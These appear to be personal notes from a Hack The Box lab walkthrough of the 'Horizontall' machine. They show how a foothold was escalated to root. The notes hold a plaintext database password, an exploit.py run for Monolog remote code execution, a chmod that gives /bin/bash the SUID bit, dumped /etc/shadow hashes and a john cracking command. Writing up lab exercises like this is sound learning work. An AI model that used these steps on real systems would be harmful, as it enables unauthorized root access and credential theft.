now let's run linPEAS to know what's going on on this machine 
/usr/lib/node_modules/npm/node_modules/npm-lifecycle/node-gyp-bin:/opt/strapi/myapi/node_modules/.bin:/opt/strapi/myapi/node_modules/.bin:/opt/str
api/node_modules/.bin:/opt/node_modules/.bin:/node_modules/.bin:/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/
usr/local/games:/snap/bin
New path exported: /usr/lib/node_modules/npm/node_modules/npm-lifecycle/node-gyp-bin:/opt/strapi/myapi/node_modules/.bin:/opt/strapi/myapi/node_mo
dules/.bin:/opt/strapi
developer:x:1000:1000:hackthebox:/home/developer:/bin/bash
root:x:0:0:root:/root:/bin/bash
strapi:x:1001:1001::/opt/strapi:/bin/sh

in /opt/strapi/myapi/config/environments/production/database.json
 we found something interesting developer [[00 Progress/Boxes/HTB/Linux/Horizontall/04 Creds]]
  "username": "developer",                                         │
  "password": "#J!:F9Zt2u" 
  var/log/nginx/access.log 
  [[Shellshock]]
  └─$ ./exploit.py http://localhost:8888 Monolog/RCE1 id                                                                                            
  AND 
  uid=0(root) gid=0(root) groups=0(root)
AYY
we got it!!


./exploit.py http://localhost:8888 Monolog/RCE1 chmod\ 4777\ /bin/bash
using \ to make it count the space as character!
 or we could've just got /etc/shadow and crack the passwords with /etc/passwd 
so what happened is we ran the script 
and we did something cool instead of just getting the flag on our machine we changed the perm of /bin/bash to suid! 
-rwsrwxrwx 1 root root 1113504 Jun  6  2019 /bin/bash                   
strapi@horizontall:~$ ./bin/bash                                         
bash: ./bin/bash: No such file or directory                          
strapi@horizontall:~$ cd /bin/                                        
strapi@horizontall:/bin$ ls -la bash                                     
-rwsrwxrwx 1 root root 1113504 Jun  6  2019 bash               
strapi@horizontall:/bin$ bash -p                                   
bash-4.4# whoami                                                     
root             



2nd method



developer:$6$XWN/h2.z$Y6PfR1h7vDa5Hu8iHl4wo5PkWe/HWqdmDdWaCECJjvta71eNYMf9BhHCHiQ48c9FMlP4Srv/Dp6LtcbjrcVW40:18779:0:99999:7:::                   
strapi:$6$a9mzQsIs$YENaG2S/H/9aqnHRl.6Qg68lCYU9/nDxvpV0xYOn6seH.JSGtU6zqu0OhR6qy8bATowftM4qBJ2ZA5x9EDSUR.:18782:0:99999:7:::
root:$6$rGxQBZV9$SbzCXDzp1MEx7xxXYuV5voXCy4k9OdyCDbyJcWuETBujfMrpfVtTXjbx82bTNlPK6Ayg8SqKMYgVlYukVOKJz1:18836:0:99999:7:::                        

developer:x:1000:1000:hackthebox:/home/developer:/bin/bash
strapi:x:1001:1001::/opt/strapi:/bin/sh
root:x:0:0:root:/root:/bin/bash

john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt pashadow 
